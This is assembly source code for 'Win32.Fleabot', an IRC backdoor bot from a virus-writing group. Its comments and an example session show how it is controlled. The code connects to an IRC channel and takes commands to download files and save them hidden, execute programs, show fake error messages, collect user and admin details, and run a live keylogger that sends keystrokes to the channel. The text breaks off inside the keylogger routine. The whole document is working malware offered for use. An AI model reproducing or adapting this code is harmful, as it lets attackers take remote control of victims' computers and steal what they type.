;Win32.Fleabot by DiA/RRLF
;DiA_hates_machine@gmx.de
;http://www.vx-dia.de.vu/
;
;Description:
; This is a small and simple IRC bot coded in assembler (use FASM to assemble). I
; wanted to write a small tutorial along with this source, but I am lazy dude ;).
; But don't cry, the code is very well commented and easy to understand. The bot
; has 12 commands, wich you can see in the example session. For greets and fucks
; use my guestbook at vx-dia.de.vu or drop me some mail to DiA_hates_machine@gmx.de
; Now have fun with this little code, assembled just 8kb baby.
;
;------- example session start------------------------------------------------------
;[10:52] * Now talking in #test
;[10:53] <DiAbolicx> ^^raw mode #test +o DiAbolicx
;[10:53] <workwqbz> bot is locked, use unlock <password>
;[10:53] <DiAbolicx> ^^unlock test
;[10:53] <workwqbz> bot now unlocked
;[10:53] <DiAbolicx> ^^raw mode #test +o DiAbolicx
;[10:53] * workwqbz sets mode: +o DiAbolicx
;[10:53] <DiAbolicx> ^^cmds
;[10:53] <workwqbz> unlock <password>  -  unlock the bot
;[10:53] <workwqbz> lock  -  lock the bot
;[10:53] <workwqbz> raw <irc command>  -  send irc command to server
;[10:53] <workwqbz> dl <http url> | <save as path>  -  download file from http
;[10:53] <workwqbz> exec <path>  -  execute a application
;[10:53] <workwqbz> msgbox <title> | <message>  -  show fake error message
;[10:53] <workwqbz> info  -  get username, system directory and is admin
;[10:53] <workwqbz> livelog  -  start logging keys and send it to channel
;[10:53] <workwqbz> stoplog  -  stop logging keys
;[10:53] <workwqbz> cmds  -  show available commands
;[10:53] <workwqbz> version  -  show bot version
;[10:53] <workwqbz> quit  -  quit bot
;[10:53] <DiAbolicx> ^^raw privmsg #test :yes, i am here
;[10:53] <workwqbz> yes, i am here
;[10:56] <DiAbolicx> ^^dl http://127.0.0.1/calc.exe | D:\calcx.exe
;[10:56] <workwqbz> download successful
;[10:56] <DiAbolicx> ^^exec D:\calcx.exe
;[10:57] <workwqbz> successful executed
;[10:57] <DiAbolicx> ^^msgbox Fleabot | Test message, dude
;[10:57] <workwqbz> message box closed by user
;[10:57] <DiAbolicx> ^^info
;[10:57] <workwqbz> Username: Work, System directory: C:\WINDOWS\system32, Admin: No
;[10:58] <DiAbolicx> ^^version
;[10:58] <workwqbz> Fleabot - a example IRC bot in asm
;[10:58] <DiAbolicx> ^^livelog
;[10:58] <workwqbz> live keylogging thread created
;[10:58] <workwqbz> {crlf}THIS IS A TEST I TYPE THIS IN MY EDITOR AND
;[10:58] <workwqbz> KEYS ARE REDIRECTED TO THE PREDEFINED IRC CHANNEL{crlf}
;[10:58] <DiAbolicx> ^^stoplog
;[10:58] <workwqbz> keylogging thread terminated
;[10:59] <DiAbolicx> ^^quit
;[10:59] * workwqbz (~workwqbz@dianet.org) Quit (workwqbz)
;------- example session end--------------------------------------------------------



include "%fasminc%\win32ax.inc"                                 ;equates, api's and macros making living easier

entry Bot                                                       ;define code start

IRCServer       equ "127.0.0.1", 0                              ;to this server we want to connect
IRCPort         equ 6667d                                       ;connect using this port
Channel         equ "#test", 0                                  ;channel name
ChannelPassword equ "test", 0                                   ;the channel password
CommandPrefix   equ "^^"                                        ;what indicate commands
BotPassword     equ "test", 0                                   ;bot password
CRLF            equ 10d, 13d                                    ;break


section '.data' data readable writeable                         ;here our datas will be stored
        Version                 db "Fleabot - a example IRC bot in asm", 0 ;identify bot version

        IsLocked                db 0d                           ;to check if bot is locked or not
        WSAData                 WSADATA                         ;used by WSAStartup, cleanup
        SocketDesc              dd ?                            ;socket descriptor is stored here
        SockAddr                dw AF_INET                      ;our sockaddr_in structure
          SockAddr_Port         dw ?                            ;here we save the port
          SockAddr_IP           dd ?                            ;here we save the ip
          SockAddr_Zero         rb 8d                           ;unused
        RandomString            rb 5d                           ;here we save a random string (a - z) for the nick
        Username                rb 36d                          ;here we store the user name for nick generation
        UsernameSize            dd 36d                          ;size of the buffer
        Nickname                rb 9d                           ;buffer for nickname
        SendBuffer              rb 512d                         ;the buffer where we store bytes to send
        ReturnBuffer            rb 512d                         ;the buffer where we story things to receive
        ByteBuffer              rb 2d                           ;for the RecvLine procedure
        Pong                    db "PONG "                      ;prefix pong message
        PongBuffer              rb 16d                          ;buffer for the pong message
        CommandBuffer           rb 128d                         ;buffer to store command and parameters
        Parameter1              rb 128d                         ;buffer for parameter 1
        Parameter2              rb 128d                         ;buffer for parameter 2
        InetHandle              dd ?                            ;handle for download command
        UrlHandle               dd ?                            ;handle for download command
        FileHandle              dd ?                            ;handle of open files
        ReadNext                dd ?                            ;how much else to download
        DownloadBuffer          rb 1024d                        ;downoad kb for kb
        BytesWritten            dd ?                            ;for writefile
        StartupInfo             STARTUPINFO                     ;for create process
        ProcessInfo             PROCESS_INFORMATION             ;for create process
        SystemDir               rb 256d                         ;buffer for system dir
        ThreadId                dd ?                            ;for creating live keylog thread
        ThreadHandle            dd ?                            ;store handle for thread
        ThreadExitCode          dd ?                            ;for terminating thread
        KeylogBuffer            rb 60d                          ;buffer for key strokes


section '.code' code readable executable                        ;code section
Bot:                                                            ;lets start
        invoke WSAStartup,\                                     ;initiates sockets DLL
                0101h,\                                         ;use version 1.1
                WSAData                                         ;pointer to wsadata strcuture

        cmp eax, 0                                              ;successful?
        jne Exit                                                ;if not exit bot

        invoke socket,\                                         ;create a socket
                AF_INET,\                                       ;family
                SOCK_STREAM,\                                   ;two way connection
                0                                               ;no particular protocol

        cmp eax, -1                                             ;successful?
        je Exit                                                 ;if not exit

        mov dword [SocketDesc], eax                             ;save socket descriptor

        invoke inet_addr,\                                      ;covert ip string to dword
                IRCServer                                       ;the ip as string

        mov dword [SockAddr_IP], eax                            ;save ip in sockaddr structure

        invoke htons,\                                          ;convert port to the network byte order
                IRCPort                                         ;the port

        mov word [SockAddr_Port], ax                            ;save it in the structure

        invoke connect,\                                        ;now connect to server
                dword [SocketDesc],\                            ;the socket descriptor
                SockAddr,\                                      ;pointer to the sockaddr structure
                16d                                             ;size of this structure

        cmp eax, 0                                              ;successful?
        jne Exit                                                ;if not exit

        call GenerateNickname                                   ;generate the nickname

        invoke lstrcpy,\                                        ;copy NICK to send buffer
                SendBuffer,\                                    ;pointer
                "NICK "                                         ;nick command

        invoke lstrcat,\                                        ;append the nickname
                SendBuffer,\                                    ;to this
                Nickname                                        ;from this

        call SendLine                                           ;send buffer to irc server

        invoke lstrcpy,\                                        ;copy USER to send buffer
                SendBuffer,\                                    ;to this
                "USER "                                         ;from this

        invoke lstrcat,\                                        ;append the nickname
                SendBuffer,\                                    ;to this
                Nickname                                        ;from this

        invoke lstrcat,\                                        ;append usermode
                SendBuffer,\                                    ;to this
                " 8 * :"                                        ;usermode

        invoke lstrcat,\                                        ;append nickname for user message
                SendBuffer,\                                    ;to this
                Nickname                                        ;from this

        call SendLine                                           ;send buffer to server

GetMotd:                                                        ;we can join when "MOTD" message is over
        call RecvLine                                           ;get a line from server
        call HandlePing                                         ;handle ping

        mov ecx, 0                                              ;clear counter

IsMotd:                                                         ;check for "MOTD"
        cmp dword [ReturnBuffer + ecx], "MOTD"                  ;is there "MOTD"?
        je HaveMotd                                             ;then we can join

        cmp byte [ReturnBuffer + ecx], 0d                       ;end of buffer?
        je GetMotd                                              ;check next line

        inc ecx                                                 ;ecx + 1
        jmp IsMotd                                              ;check next position

HaveMotd:                                                       ;now we can join
        invoke lstrcpy,\                                        ;copy JOIN to buffer
                SendBuffer,\                                    ;pointer
                "JOIN "                                         ;join command

        invoke lstrcat,\                                        ;append the channel
                SendBuffer,\                                    ;pointer
                Channel                                         ;channel name

        invoke lstrcat,\                                        ;append a space
                SendBuffer,\                                    ;pointer
                " "                                             ;space

        invoke lstrcat,\                                        ;append the channel password
                SendBuffer,\                                    ;pointer
                ChannelPassword                                 ;pass

        call SendLine                                           ;send to server

        invoke lstrcpy,\                                        ;copy MODE to buffer
                SendBuffer,\                                    ;pointer
                "MODE "                                         ;to set key

        invoke lstrcat,\                                        ;append channel
                SendBuffer,\                                    ;pointer
                Channel                                         ;channel name

        invoke lstrcat,\                                        ;append key mode and secret
                SendBuffer,\                                    ;buffer
                " +nsk "                                        ;no external message, secret, key

        invoke lstrcat,\                                        ;append the password aka key
                SendBuffer,\                                    ;pointer
                ChannelPassword                                 ;the pass

        call SendLine                                           ;send it to irc server

RecvCommand:                                                    ;check if received line include a command
        call RecvLine                                           ;get a line
        call HandlePing                                         ;handle ping if it is

        mov ecx, 0                                              ;set counter to zero

IsCommand:                                                      ;check if command
        cmp word [ReturnBuffer + ecx], CommandPrefix            ;is command prefix?
        je HaveCommand                                          ;then extract command

        cmp byte [ReturnBuffer + ecx], 0                        ;is end of line?
        je RecvCommand                                          ;then wait for next

        inc ecx                                                 ;increase counter by one
        jmp IsCommand                                           ;check next position

HaveCommand:                                                    ;extract command
        mov ebx, ReturnBuffer                                   ;pointer to buffer
        add ebx, ecx                                            ;add counter
        add ebx, 2d                                             ;add length of command prefix

        invoke lstrcpy,\                                        ;add to command buffer
                CommandBuffer,\                                 ;pointer
                ebx                                             ;points to command position

        call ExecuteCommand                                     ;execute command
        jmp RecvCommand                                         ;next command

Exit:
        invoke WSACleanup                                       ;cleanup the wsa

        invoke ExitProcess,\                                    ;exit program
                0                                               ;exit code


SendLine:                                                       ;this procedure sends a line to the irc server
        invoke lstrcat,\                                        ;append crlf to the send buffer
                SendBuffer,\                                    ;buffer
                CRLF                                            ;10d, 13d

        invoke lstrlen,\                                        ;get length of buffer
                SendBuffer                                      ;buffer

        invoke send,\                                           ;send this line
                dword [SocketDesc],\                            ;socket descriptor
                SendBuffer,\                                    ;send this
                eax,\                                           ;length of buffer
                0                                               ;no flags

        cmp eax, -1                                             ;succeddful?
        je Exit                                                 ;if not exit
ret                                                             ;return to call


RecvLine:                                                       ;this procedure receive a line from server
        mov dword [ReturnBuffer], 0                             ;clear the buffer

GetLine:                                                        ;recv until crlf
        invoke recv,\                                           ;receive a byte
                dword [SocketDesc],\                            ;socket descriptor
                ByteBuffer,\                                      ;1 byte buffer
                1d,\                                            ;get just one byte
                0                                               ;no flags

        cmp eax, 0                                              ;error?
        je Exit                                                 ;if so, exit

        cmp byte [ByteBuffer], 10d                              ;arrived crlf?
        je HaveLine                                             ;then return

        invoke lstrcat,\                                        ;append byte to buffer
                ReturnBuffer,\                                  ;pointer
                ByteBuffer                                      ;the byte

        jmp GetLine                                             ;receive next byte

HaveLine:                                                       ;we have a line and can..
ret                                                             ;...return


GenerateNickname:                                               ;this procedure generates a random nick
        mov ecx, 0                                              ;clear counter

GetByte:                                                        ;get a single byte
        invoke GetTickCount                                     ;get the run time

        cmp al, 97d                                             ;after "a"
        jnb CheckBelow                                          ;if so, check if its before "z"

        jmp Sleep33                                             ;sleep 33 ms

CheckBelow:
        cmp al, 122d                                            ;before "z"
        jna HaveByte                                            ;then save byte

        jmp Sleep33                                             ;sleep 33 ms

HaveByte:                                                       ;save a byte
        mov byte [RandomString + ecx], al                       ;save byte at the position
        inc ecx                                                 ;ecx + 1

        cmp ecx, 4d                                             ;got 4 bytes?
        je GenerateIt                                           ;now generate it

Sleep33:                                                        ;sleep 33ms and try again to get a byte a - z
        push ecx                                                ;push counter

        invoke Sleep,\                                          ;sleep
                33d                                             ;33ms

        pop ecx                                                 ;restore counter

        jmp GetByte                                             ;try to get a byte a -z

GenerateIt:                                                     ;have random string, now create nick
        invoke GetUserName,\                                    ;get the logged on user name
                Username,\                                      ;pointer to buffer
                UsernameSize                                    ;size of buffer

        cmp eax, 0                                              ;successful?
        jne ExtractUserName                                     ;if so jump there

        mov dword [Username], "rrlf"                            ;no user name got, fill it with text anyways

ExtractUserName:                                                ;get 4 bytes from the user name
        mov byte [Username + 4d], 0                             ;set string end at 5th position

        invoke lstrcpy,\                                        ;copy username to nick buffer
                Nickname,\                                      ;pointer to buffer
                Username                                        ;pointer to buffer

        invoke lstrcat,\                                        ;append random string
                Nickname,\                                      ;to this
                RandomString                                    ;from this

        invoke CharLowerBuff,\                                  ;now mae nick to lower
                Nickname,\                                      ;the nick
                8d                                              ;length

ret                                                             ;return to call


HandlePing:                                                     ;this procedure handle ping and pong
        cmp dword [ReturnBuffer], "PING"                        ;is a ping?
        jne NoPing                                              ;if not return

        invoke lstrcpy,\                                        ;copy ping message to buffer
                PongBuffer,\                                    ;to this
                ReturnBuffer + 6d                               ;sendbuffer + "PING "

        invoke lstrcpy,\                                        ;copy PONG message to sendbuffer
                SendBuffer,\                                    ;buffer
                Pong                                            ;pong message

        call SendLine                                           ;send pong

NoPing:                                                         ;its not a ping
ret                                                             ;return

SendPrivmsg:                                                    ;send a message to channel
        invoke lstrcpy,\                                        ;copy PRIVMSG to send buffer
                SendBuffer,\                                    ;pointer
                "PRIVMSG "                                      ;irc command

        invoke lstrcat,\                                        ;append channel
                SendBuffer,\                                    ;pointer
                Channel                                         ;the chan

        invoke lstrcat,\                                        ;append space
                SendBuffer,\                                    ;pointer
                " :"                                            ;sepertor

        invoke lstrcat,\                                        ;append message
                SendBuffer,\                                    ;pointer
                ReturnBuffer                                    ;pointer

        call SendLine                                           ;send to server
ret                                                             ;return

ExecuteCommand:                                                 ;execute received command
        cmp dword [CommandBuffer], "unlo"                       ;is unlock command?
        je CmdUnlock                                            ;execute it

        cmp byte [IsLocked], 0                                  ;is bot locked?
        je BotLocked                                            ;jmp there

        cmp dword [CommandBuffer], "cmds"                       ;is commands command?
        je CmdCmds                                              ;then show commands

        cmp dword [CommandBuffer], "lock"                       ;is lock command?
        je CmdLock                                              ;lock it then

        cmp dword [CommandBuffer], "quit"                       ;is quit command?
        je CmdQuit                                              ;quit from irc, exit

        cmp dword [CommandBuffer], "raw "                       ;is raw command?
        je CmdRaw                                               ;execute raw irc command

        cmp word [CommandBuffer], "dl"                          ;is download command?
        je CmdDl                                                ;download file from http

        cmp dword [CommandBuffer], "exec"                       ;is execute command?
        je CmdExec                                              ;then execute application

        cmp dword [CommandBuffer], "vers"                       ;is version command?
        je CmdVersion                                           ;show it then

        cmp dword [CommandBuffer], "msgb"                       ;is msgbox command?
        je CmdMsgbox                                            ;show it then

        cmp dword [CommandBuffer], "info"                       ;is info command?
        je CmdInfo                                              ;then show informations about victim

        cmp dword [CommandBuffer], "live"                       ;is livelog command?
        je CmdLivelog                                           ;log it then

        cmp dword [CommandBuffer], "stop"                       ;is stoplog command?
        je CmdStoplog                                           ;stop it then

        invoke lstrcpy,\                                        ;unknown command
                ReturnBuffer,\                                  ;pointer
                "unknown command, type 'cmds' for commands"     ;mesage

        call SendPrivmsg                                        ;send to chan
        jmp ExecuteCommandReturn                                ;return

BotLocked:
        invoke lstrcpy,\                                        ;copy locked message to return buffer
                ReturnBuffer,\                                  ;pointer
                "bot is locked, use unlock <password>"          ;message

        call SendPrivmsg                                        ;send it
        jmp ExecuteCommandReturn                                ;return

CmdUnlock:                                                      ;unlock command
        invoke lstrlen,\                                        ;get password len
                BotPassword                                     ;of this

        inc eax                                                 ;eax + 1

        invoke lstrcpyn,\                                       ;copy password to parameter1 buffer
                Parameter1,\                                    ;pointer
                CommandBuffer + 7d,\                            ;skip "unlock "
                eax                                             ;dont copy the crlf

        invoke lstrcmp,\                                        ;compare password
                BotPassword,\                                   ;password
                Parameter1                                      ;received password

        cmp eax, 0                                              ;right pass?
        jne WrongPassword                                       ;if not send back wrong pass

        mov byte [IsLocked], 1d                                 ;set unlock code

        invoke lstrcpy,\                                        ;tell user bot is unlocked
                ReturnBuffer,\                                  ;buffer
                "bot now unlocked"                              ;message

        call SendPrivmsg                                        ;send to channel
        jmp ExecuteCommandReturn                                ;return

WrongPassword:
        invoke lstrcpy,\                                        ;copy wrong pass message
                ReturnBuffer,\                                  ;pointer
                "wrong password"                                ;message

        call SendPrivmsg                                        ;send to chan
        jmp ExecuteCommandReturn                                ;return

CmdCmds:                                                        ;show all comands
        invoke lstrcpy,\                                        ;copy unlock command
                ReturnBuffer,\                                  ;pointer to buffer
                "unlock <password>  -  unlock the bot"          ;message

        call SendPrivmsg                                        ;send it to channel

        invoke Sleep,\                                          ;sleep a second
                1000d                                           ;1 sec

        invoke lstrcpy,\                                        ;copy lock command
                ReturnBuffer,\                                  ;pointer to buffer
                "lock  -  lock the bot"                         ;message

        call SendPrivmsg                                        ;send it to channel

        invoke Sleep,\                                          ;sleep a second
                1000d                                           ;1 sec

        invoke lstrcpy,\                                        ;copy raw command
                ReturnBuffer,\                                  ;pointer to buffer
                "raw <irc command>  -  send irc command to server" ;message

        call SendPrivmsg                                        ;send it to channel

        invoke Sleep,\                                          ;sleep a second
                1000d                                           ;1 sec

        invoke lstrcpy,\                                        ;copy dl command
                ReturnBuffer,\                                  ;pointer to buffer
                "dl <http url> | <save as path>  -  download file from http" ;message

        call SendPrivmsg                                        ;send it to channel

        invoke Sleep,\                                          ;sleep a second
                1000d                                           ;1 sec

        invoke lstrcpy,\                                        ;copy exec command
                ReturnBuffer,\                                  ;pointer to buffer
                "exec <path>  -  execute a application"         ;message

        call SendPrivmsg                                        ;send it to channel

        invoke Sleep,\                                          ;sleep a second
                1000d                                           ;1 sec

        invoke lstrcpy,\                                        ;copy msgbox command
                ReturnBuffer,\                                  ;pointer to buffer
                "msgbox <title> | <message>  -  show fake error message" ;message

        call SendPrivmsg                                        ;send it to channel

        invoke Sleep,\                                          ;sleep a second
                1000d                                           ;1 sec

        invoke lstrcpy,\                                        ;copy info command
                ReturnBuffer,\                                  ;pointer to buffer
                "info  -  get username, system directory and is admin" ;message

        call SendPrivmsg                                        ;send it to channel

        invoke Sleep,\                                          ;sleep a second
                1000d                                           ;1 sec

        invoke lstrcpy,\                                        ;copy livelog command
                ReturnBuffer,\                                  ;pointer to buffer
                "livelog  -  start logging keys and send it to channel" ;message

        call SendPrivmsg                                        ;send it to channel

        invoke Sleep,\                                          ;sleep a second
                1000d                                           ;1 sec

        invoke lstrcpy,\                                        ;copy stoplog command
                ReturnBuffer,\                                  ;pointer to buffer
                "stoplog  -  stop logging keys" ;message

        call SendPrivmsg                                        ;send it to channel

        invoke Sleep,\                                          ;sleep a second
                1000d                                           ;1 sec

        invoke lstrcpy,\                                        ;copy cmds command
                ReturnBuffer,\                                  ;pointer to buffer
                "cmds  -  show available commands"              ;message

        call SendPrivmsg                                        ;send it to channel

        invoke lstrcpy,\                                        ;copy version command
                ReturnBuffer,\                                  ;pointer to buffer
                "version  -  show bot version"                  ;message

        call SendPrivmsg                                        ;send it to channel

        invoke Sleep,\                                          ;sleep a second
                1000d                                           ;1 sec

        invoke lstrcpy,\                                        ;copy quit command
                ReturnBuffer,\                                  ;pointer to buffer
                "quit  -  quit bot"                             ;message

        call SendPrivmsg                                        ;send it to channel

        invoke Sleep,\                                          ;sleep a second
                1000d                                           ;1 sec

        jmp ExecuteCommandReturn                                ;return

CmdLock:                                                        ;lock command
        mov byte [IsLocked], 0                                  ;set it as locked

        invoke lstrcpy,\                                        ;return message
                ReturnBuffer,\                                  ;buffer
                "bot now locked"                                ;message

        call SendPrivmsg                                        ;send it
        jmp ExecuteCommandReturn                                ;and return

CmdQuit:                                                        ;quit bot
        invoke lstrcpy,\                                        ;copy QUIT to buffer
                SendBuffer,\                                    ;pointer
                "QUIT"                                          ;quit command

        call SendLine                                           ;send it

        invoke Sleep,\                                          ;sleep
                2000d                                           ;2 seconds

        jmp Exit                                                ;exit bot

CmdRaw:                                                         ;send raw command to irc server
        invoke lstrcpy,\                                        ;copy command to buffer
                SendBuffer,\                                    ;buffer
                CommandBuffer + 4                               ;skip "raw "

        call SendLine                                           ;send it
        jmp ExecuteCommandReturn                                ;return

CmdDl:                                                          ;download file via http
        call ExtractParameters                                  ;get the two parameters

        invoke InternetOpen,\                                   ;initialise wininet
                Parameter1,\                                    ;use url as agent, not necessary
                0,\                                             ;get configs from registry (INTERNET_OPEN_TYPE_PRECONFIG)
                0,\                                             ;no proxy
                0,\                                             ;also no bypass
                0                                               ;no flags

        cmp eax, 0                                              ;error?
        je DownloadFileError                                    ;if so jump to error

        mov dword [InetHandle], eax                             ;save handle

        invoke InternetOpenUrl,\                                ;open the http url
                dword [InetHandle],\                            ;handle from internetopen
                Parameter1 + 3,\                                ;pointer to the url, pass "dl "
                0,\                                             ;no need for headers
                0,\                                             ;so are the length
                0,\                                             ;no specific flags
                0                                               ;no context needed

        cmp eax, 0                                              ;error?
        je DownloadFileError                                    ;then show error

        mov dword [UrlHandle], eax                              ;save handle

        invoke CreateFile,\                                     ;create the file for writing
                Parameter2,\                                    ;pointer to filename
                GENERIC_WRITE,\                                 ;we just want to write
                FILE_SHARE_WRITE,\                              ;write it
                0,\                                             ;security attributes, nohh
                CREATE_NEW,\                                    ;fail if file exist
                FILE_ATTRIBUTE_HIDDEN,\                         ;make it as hidden
                0                                               ;no template file

        cmp eax, 0                                              ;error?
        je DownloadFileError                                    ;send error back

        mov dword [FileHandle], eax                             ;save handle

        inc dword [ReadNext]                                    ;increase readnext by one

ReadNextBytes:                                                  ;read bytes by bytes
        cmp dword [ReadNext], 0                                 ;no more to read
        je DownloadComplete                                     ;then download complete

        invoke InternetReadFile,\                               ;read from the open url
                dword [UrlHandle],\                             ;open handle
                DownloadBuffer,\                                ;pointer to buffer
                1024d,\                                         ;bytes to read, kbyte by kbyte
                ReadNext                                        ;how much bytes readed?

        invoke WriteFile,\                                      ;write bytes to file
                dword [FileHandle],\                            ;open handle
                DownloadBuffer,\                                ;point to downloaded bytes
                dword [ReadNext],\                              ;write that much bytes
                BytesWritten,\                                  ;how much bytes are written
                0                                               ;no overlapped

        jmp ReadNextBytes                                       ;process next bytes

DownloadComplete:                                               ;download is complete
        invoke CloseHandle,\                                    ;close file
                dword [FileHandle]                              ;via handle

        invoke InternetCloseHandle,\                            ;close inet
                dword [UrlHandle]                               ;via handle

        invoke InternetCloseHandle,\                            ;again
                dword [InetHandle]                              ;via handle

        invoke lstrcpy,\                                        ;copy success message
                ReturnBuffer,\                                  ;to return buffer
                "download successful"                           ;message

        call SendPrivmsg                                        ;send to channel
        jmp ExecuteCommandReturn                                ;return

DownloadFileError:
        invoke lstrcpy,\                                        ;copy fail message
                ReturnBuffer,\                                  ;to return buffer
                "download failed"                               ;message

        call SendPrivmsg                                        ;send to channel
        jmp ExecuteCommandReturn                                ;return

CmdExec:                                                        ;execute a file
        invoke lstrlen,\                                        ;get length of buffer
                CommandBuffer                                   ;of this

        mov byte [CommandBuffer + eax - 1], 0                   ;clear the crlf

        invoke CreateProcess,\                                  ;via create process
                CommandBuffer + 5d,\                            ;application, skip "exec "
                CommandBuffer + 5d,\                            ;user
                0,\                                             ;no process attributes
                0,\                                             ;no thread attributes
                0,\                                             ;no inerhits
                CREATE_NEW_CONSOLE,\                            ;own process
                0,\                                             ;no environment
                0,\                                             ;nor current directory
                StartupInfo,\                                   ;startup structure
                ProcessInfo                                     ;process structure

        cmp eax, 0                                              ;error?
        je ExecError                                            ;show it then

        invoke lstrcpy,\                                        ;copy message
                ReturnBuffer,\                                  ;to this
                "successful executed"                           ;yehaw

        call SendPrivmsg                                        ;send to chan
        jmp ExecuteCommandReturn                                ;return

ExecError:                                                      ;error occured
        invoke lstrcpy,\                                        ;copy message
                ReturnBuffer,\                                  ;to this
                "execution failed"                              ;damn

        call SendPrivmsg                                        ;send to chan
        jmp ExecuteCommandReturn                                ;return

CmdVersion:                                                     ;show bot version
        invoke lstrcpy,\                                        ;copy version to buffer
                ReturnBuffer,\                                  ;pointer
                Version                                         ;from version

        call SendPrivmsg                                        ;send to channel
        jmp ExecuteCommandReturn                                ;return

CmdMsgbox:                                                      ;show a error message box
        call ExtractParameters                                  ;get two parameters

        invoke MessageBox,\                                     ;show messagbox, local
                0,\                                             ;no owner
                Parameter2,\                                    ;Text
                Parameter1 + 7d,\                               ;title, skip "msgbox "
                MB_ICONERROR                                    ;error style

        invoke lstrcpy,\                                        ;copy message
                ReturnBuffer,\                                  ;pointer
                "message box closed by user"                    ;message

        call SendPrivmsg                                        ;send to channeö
        jmp ExecuteCommandReturn                                ;return

CmdInfo:                                                        ;show informations
        invoke lstrcpy,\                                        ;copy "Username" to buffer
                ReturnBuffer,\                                  ;pointer
                "Username: "                                    ;msg

        invoke GetUserName,\                                    ;get user name
                Username,\                                      ;buffer
                UsernameSize                                    ;size

        invoke lstrcat,\                                        ;copy username
                ReturnBuffer,\                                  ;buffer
                Username                                        ;pointer

        invoke lstrcat,\                                        ;copy "sysdir"
                ReturnBuffer,\                                  ;to buffer
                ", System directory: "                          ;msg

        invoke GetSystemDirectory,\                             ;get sys dir to test
                SystemDir,\                                     ;buffer
                256d                                            ;size

        invoke lstrcat,\                                        ;copy to buffer
                ReturnBuffer,\                                  ;to buffer
                SystemDir                                       ;from here

        invoke lstrcat,\                                        ;append "admin"
                ReturnBuffer,\                                  ;buffer
                ", Admin: "

        invoke lstrcat,\                                        ;append filename to system dir
                SystemDir,\                                     ;to buffer
                "DiA.RRLF"                                      ;filename ;)

        invoke CreateFile,\                                     ;try to create this file
                SystemDir,\                                     ;file in system directory
                GENERIC_WRITE,\                                 ;check write
                FILE_SHARE_WRITE,\                              ;yeh
                0,\                                             ;no security attributes
                CREATE_ALWAYS,\                                 ;overwrite if exist
                FILE_ATTRIBUTE_HIDDEN,\                         ;as hidden
                0                                               ;no template file

        cmp eax, -1                                             ;error?
        je NoAdmin                                              ;then user is no admin

        invoke lstrcat,\                                        ;copy "yes"
                ReturnBuffer,\                                  ;to buffer
                "Yes"                                           ;message

        call SendPrivmsg                                        ;send to channel
        jmp ExecuteCommandReturn                                ;and return

NoAdmin:                                                        ;user is no admin
        invoke lstrcat,\                                        ;copy "no"
                ReturnBuffer,\                                  ;to buffer
                "No"                                            ;message

        call SendPrivmsg                                        ;send to channel
        jmp ExecuteCommandReturn                                ;and return

CmdLivelog:                                                     ;create a thread for live keylogging
        invoke CreateThread,\                                   ;create the keylog thread
                0,\                                             ;no security attributes
                0,\                                             ;default stack size
                LiveKeylog,\                                    ;procedure start
                0,\                                             ;no parameters
                0,\                                             ;start right now
                ThreadId                                        ;store here the thread id

        cmp eax, 0                                              ;error?
        je ThreadError                                          ;then jump there

        mov dword [ThreadHandle], eax                           ;store thread handle

        invoke lstrcpy,\                                        ;copy success message
                ReturnBuffer,\                                  ;to the buffer
                "live keylogging thread created"                ;yehaw

        call SendPrivmsg                                        ;send to channel
        jmp ExecuteCommandReturn                                ;ret

ThreadError:
        invoke lstrcpy,\                                        ;copy error message
                ReturnBuffer,\                                  ;to this
                "error on creating live keylogging thread"      ;buh

        call SendPrivmsg                                        ;send it
        jmp ExecuteCommandReturn                                ;return

CmdStoplog:                                                     ;stop keylogging thread
        invoke GetExitCodeThread,\                              ;get exit code to terminate thread
                dword [ThreadHandle],\                          ;thread handle
                ThreadExitCode                                  ;store it here

        invoke TerminateThread,\                                ;exit it now
                dword [ThreadHandle],\                          ;handle
                dword [ThreadExitCode]                          ;with this

        cmp eax, 0                                              ;error?
        je ExitThreadError                                      ;show it then

        mov dword [ThreadId], 0                                 ;clear id
        mov dword [ThreadHandle], 0                             ;clear handle
        mov dword [ThreadExitCode], 0                           ;clear exit code

        invoke lstrcpy,\                                        ;copy sucess message
                ReturnBuffer,\                                  ;to buffer
                "keylogging thread terminated"                  ;msg

        call SendPrivmsg                                        ;send it
        jmp ExecuteCommandReturn                                ;ret

ExitThreadError:                                                ;arghh, maybe not exist
        invoke lstrcpy,\                                        ;copy error message
                ReturnBuffer,\                                  ;to buffer
                "error terminating keylogging thread"           ;msg

        call SendPrivmsg                                        ;send it
        jmp ExecuteCommandReturn                                ;ret

ExecuteCommandReturn:                                           ;return
ret                                                             ;return to call


ExtractParameters:                                              ;this procedure extracts two parameter from a cmd
        mov edx, CommandBuffer                                  ;pointer to buffer
        mov ecx, 0                                              ;zero counter

FindCut:                                                        ;get the "|" cur
        cmp byte [edx + ecx], "|"                               ;is byte at position a "|"?
        je HaveCut                                              ;then extract it

        inc ecx                                                 ;counter + 1
        jmp FindCut                                             ;scan next position

HaveCut:                                                        ;have cut, extract it
        add edx, ecx                                            ;add counter to start of buffer
        mov byte [edx - 1], 0                                   ;zero the "|"
        add edx, 2d                                             ;skip space

        invoke lstrcpy,\                                        ;copy parameter2
                Parameter2,\                                    ;destination
                edx                                             ;source

        invoke lstrlen,\                                        ;get length to erase crlf
                Parameter2                                      ;of buffer

        mov byte [Parameter2 + eax - 1], 0                      ;erase crlf

        invoke lstrcpy,\                                        ;copy parameter1
                Parameter1,\                                    ;buffer
                CommandBuffer                                   ;source
ret                                                             ;return to call


LiveKeylog:                                                     ;this procedure logs keys and send it to channel
        invoke lstrlen,\                                        ;get legth of buffer
                KeylogBuffer                                    ;key strokes buffer

        cmp eax, 50d                                            ;is over 50 characters?
        jae SendKeyLine                                         ;then send it to channel

        mov ebx, 0                                              ;set counter to zero (just use ebx because api dont change it

NextKey:                                                        ;try if next key is pressed
        cmp ebx, 255d                                           ;end of possible keys?
        je LiveKeylog                                           ;the try from start again

        invoke GetAsyncKeyState,\                               ;get status of this key
                ebx                                             ;in ebx (0 - 255)

        cmp eax, -32767d                                        ;is pressed?
        jne ScanNextKey                                         ;if not check next possible key

        cmp ebx, 20h                                            ;VK_SPACE
        je IsSpace                                              ;if it is this key, jump there

        cmp ebx, 8h                                             ;VK_BACK
        je IsBack                                               ;if it is this key, jump there

        cmp ebx, 9h                                             ;VK_TAB
        je IsTab                                                ;if it is this key, jump there

        cmp ebx, 60h                                            ;VK_NUMPAD0
        je IsNumpad0                                            ;if it is this key, jump there

        cmp ebx, 61h                                            ;VK_NUMPAD1
        je IsNumpad1                                            ;if it is this key, jump there

        cmp ebx, 62h                                            ;VK_NUMPAD2
        je IsNumpad2                                            ;if it is this key, jump there

        cmp ebx, 63h                                            ;VK_NUMPAD3
        je IsNumpad3                                            ;if it is this key, jump there

